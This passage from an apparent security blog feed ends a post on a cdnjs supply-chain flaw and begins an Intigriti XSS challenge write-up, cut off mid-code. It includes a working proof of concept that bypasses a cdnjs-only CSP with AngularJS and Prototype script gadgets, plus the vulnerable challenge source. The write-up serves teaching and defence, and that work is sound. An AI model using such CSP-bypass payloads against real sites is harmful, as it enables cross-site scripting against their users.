library，懶得一個一個新增上去。</p>\n<p>這時候若是網站有著 XSS 漏洞，一般情況下 CSP 應該會有防禦作用，阻止這些不信任的程式碼的執行。但很遺憾地，CSP 中 <code>https://cdnjs.cloudflare.com</code> 的這個路徑，讓攻擊者可以輕鬆繞過 CSP。</p>\n<p>先講一下原理，原理就是 cdnjs 上除了你想要用的 library 之外，還有千千萬萬個不同的 library，而有些 library 本身提供的功能，讓攻擊者不需要執行 JS，也能執行任意程式碼。</p>\n<p>例如說 AngularJS，在舊版本中有著 <a href=\"https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs\">Client-Side Template Injection</a> 的漏洞，只需要 HTML 就可以執行程式碼，像是這類「利用其他合法的 script 幫助你執行攻擊程式碼」的手法，叫做 script gadgets，想知道更多可以參考：<a href=\"https://github.com/google/security-research-pocs/tree/master/script-gadgets\">security-research-pocs/script-gadgets</a></p>\n<p>假設我們現在的 CSP 只允許 <code>https://cdnjs.cloudflare.com</code>，該怎麼繞過呢？我找到這兩個很棒的資源：</p>\n<ol>\n<li><a href=\"https://blog.0daylabs.com/2016/09/09/bypassing-csp/\">Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup</a></li>\n<li><a href=\"https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22\">H5SC Minichallenge 3: &quot;Sh＊t, it's CSP!&quot;</a></li>\n</ol>\n<p>只要利用 AngularJS + Prototype 這兩個 library，就可以在符合 CSP（只引入 cdnjs 底下的腳本）的情況下進行 XSS，我做了一個簡單的 demo：<a href=\"https://aszx87410.github.io/demo/csp_bypass/cdnjs.html\">https://aszx87410.github.io/demo/csp_bypass/cdnjs.html</a></p>\n<p>完整程式碼如下：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>CSP bypass<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Security-Policy<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>default-src <span class=\"token punctuation\">'</span>none<span class=\"token punctuation\">'</span>; script-src https://cdnjs.cloudflare.com<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">ng-app</span> <span class=\"token attr-name\">ng-csp</span><span class=\"token punctuation\">></span></span><br>      { $on.curry.call().alert('xss') }}<br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>想要避免這種 CSP bypass，就只能把 CSP 中 cdnjs 的路徑寫死，把整個腳本的 URL 寫上去，而不是只寫 domain。否則，這類型的 CSP 其實會幫助攻擊者更容易突破 CSP 的限制，進而執行 XSS 攻擊。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>攻擊手法千千百百種，發現 cdnjs 漏洞的研究員近期鍾情於 supply chain attack，不只 cdnjs，連 <a href=\"https://blog.ryotak.me/post/homebrew-security-incident-en/\">Homebrew</a> 跟 <a href=\"https://blog.ryotak.me/post/pypi-potential-remote-code-execution-en/\">PyPI</a> 甚至是 <a href=\"https://blog.ryotak.me/post/definitelytyped-tamper-with-arbitrary-packages-en/\">@types</a> 也都被找到漏洞。</p>\n<p>如果要直接在頁面上用 script 引入第三方的網址，記得先確認對方的網站是值得信任的，如果可以的話也請加上 integrity 屬性，避免檔案被竄改，連帶影響到自己的服務。也要注意 CSP 的設定，對於 cdnjs 這種網站，若是只設置 domain 的話，已經有了可行的繞過手法，在設置前請多加注意。</p>\n<p>在談到前端的安全時，大家第一個會想到 XSS，第二個會想到 CSRF，然後可能就沒了。這篇文章希望藉由 cdnjs 的漏洞讓前端工程師們認識什麼是供應鏈攻擊。只要有意識到這個攻擊手法，日後在開發時就會多留意一些，就會注意到引入第三方 library 所帶來的風險。</p>\n",
      "date_published": "2021-08-09T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/learn-from-intigriti-xss-0721/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/learn-from-intigriti-xss-0721/",
      "title": "Intigriti 七月份 XSS 挑戰：突破層層關卡",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<!-- 從一題 XSS 的題目中突破層層關卡，學習各種前端相關知識 -->\n<!-- summary -->\n<p><a href=\"https://www.intigriti.com/\">Intigriti</a> 這個網站每個月都會有 XSS 挑戰，給你一週的時間去解一道 XSS 的題目，目標是成功執行 <code>alert(document.domain)</code>。</p>\n<p>身為一個前端資安混血工程師，我每個月都有參加（但不一定有解出來），底下是前幾個月的筆記：</p>\n<ol>\n<li><a href=\"https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/\">解題心得：Intigriti's 0421 XSS challenge（上）</a></li>\n<li><a href=\"https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/\">Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</a></li>\n<li><a href=\"https://blog.huli.tw/2021/07/03/xss-challenge-intigriti-june-review/\">Intigriti 六月份 XSS 挑戰檢討</a></li>\n</ol>\n<p>每個月的挑戰都相當有趣，我覺得難易度也掌握得不錯，沒有到超級無敵難，但也不會輕易到一下就被解開。而這個月的挑戰我也覺得很好玩，因此在解開之後寫了這篇心得跟大家分享，期待有越來越多人可以一起參與。</p>\n<p>挑戰網址：<a href=\"https://challenge-0721.intigriti.io/\">https://challenge-0721.intigriti.io/</a></p>\n<h2 id=\"%E5%88%86%E6%9E%90%E9%A1%8C%E7%9B%AE\"><a class=\"direct-link\" href=\"#%E5%88%86%E6%9E%90%E9%A1%8C%E7%9B%AE\">#</a> 分析題目</h2>\n<p>仔細看一下會發現這次的挑戰其實比較複雜一點，因為有三個頁面跟一堆的 <code>postMessage</code> 還有 <code>onmessage</code>，要搞清楚他們的關係需要一些時間。</p>\n<p>我看了一下之後因為懶得搞懂，所以決定從反方向開始解。如果是 XSS 題目，代表一定要有地方可以執行程式碼，通常都是 <code>eval</code> 或是 <code>innerHTML</code>，所以可以先找到這邊，再往回推該如何抵達。</p>\n<p>接下來就來簡單看一下那三個頁面：</p>\n<ol>\n<li>index.html</li>\n<li>htmledit.php</li>\n<li>console.php</li>\n</ol>\n<h3 id=\"index.html\"><a class=\"direct-link\" href=\"#index.html\">#</a> index.html</h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-container<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-header-small<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Your payloads:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-content<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>       <span class=\"token comment\">// redirect all htmledit messages to the console</span><br>       <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">{</span><br>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>fromIframe<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>             frames<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>cmd<span class=\"token operator\">:</span><span class=\"token string\">\"log\"</span><span class=\"token punctuation\">,</span>message<span class=\"token operator\">:</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>fromIframe<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>          <span class=\"token punctuation\">}</span><br>       <span class=\"token punctuation\">}</span><br>       <span class=\"token comment\">/*<br>       var DEV = true;<br>       var store = {<br>           users: {<br>             admin: {<br>                username: 'inti',<br>                password: 'griti'<br>             }, moderator: {<br>                username: 'root',<br>                password: 'toor'<br>             }, manager: {<br>                username: 'andrew',<br>                password: 'hunter2'<br>             },<br>          }<br>       }<br>       */</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>editor<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>bin<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>          <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\">frames<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>cmd<span class=\"token operator\">:</span><span class=\"token string\">'clear'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>🗑️<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>console</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./console.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>codeFrame</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./htmledit.php?code=&lt;img src=x><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br>       <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>textarea</span> <span class=\"token attr-name\">oninput</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>this.previousElementSibling.src=<span class=\"token punctuation\">'</span>./htmledit.php?code=<span class=\"token punctuation\">'</span>+escape(this.value)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>x</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>textarea</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>除了被註解的那一段變數之外，看起來沒什麼特別的。</p>\n<h3 id=\"htmledit.php\"><a class=\"direct-link\" href=\"#htmledit.php\">#</a> htmledit.php</h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!-- &amp;lt;img src=x&amp;gt; --></span><br><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Native HTML editor<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>d8f00e6635e69bafbf1210ff32f96bdb<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>        window<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>type<span class=\"token operator\">:</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>                obj<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>                obj<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Exception called on </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>outerHTML<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            top<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>fromIframe<span class=\"token operator\">:</span>obj<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function-variable function\">onmessage</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">{</span><br>            top<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>fromIframe<span class=\"token operator\">:</span>e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>x</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><br><span class=\"token comment\">&lt;!-- /* Page loaded in 0.000024 seconds */ --></span></code></pre>\n<p>這個頁面會直接把 query string code 的內容顯示在頁面上，然後開頭還有一段神秘的註解，是把 code encode 之後的內容。但儘管顯示在頁面上卻沒辦法執行，因為有著嚴格的 CSP：<code>script-src 'nonce-...';frame-src https:;object-src 'none';base-uri 'none';</code></p>\n<p>不過 CSP 裡面特別開了 frame-src，我看到這邊的時候想說：「這可能是個提示，提示我們要用 iframe」</p>\n<h3 id=\"console.php\"><a class=\"direct-link\" href=\"#console.php\">#</a> console.php</h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c4936ad76292ee7100ecb9d72054e71f<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>        name <span class=\"token operator\">=</span> <span class=\"token string\">'Console'</span><br>        document<span class=\"token punctuation\">.</span>title <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>top <span class=\"token operator\">===</span> window<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>            document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span>parentNode<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hide code if not on iframe</span><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"><br>        <span class=\"token selector\">body, ul</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span>0<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span>0<span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token selector\">ul#console</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> lightyellow<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">list-style-type</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Roboto Mono'</span><span class=\"token punctuation\">,</span> monospace<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 25px<span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token selector\">ul#console li</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span> solid 1px #80808038<span class=\"token punctuation\">;</span><br>            <span class=\"token property\">padding-left</span><span class=\"token punctuation\">:</span> 5px<span class=\"token punctuation\">;</span><br><br>        <span class=\"token punctuation\">}</span><br>    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>console<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>c4936ad76292ee7100ecb9d72054e71f<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">anchor</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">s</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">normalize</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NFC'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">u</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">unescape</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">t</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">s</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> s<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">parse</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> e <span class=\"token operator\">===</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">s</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token 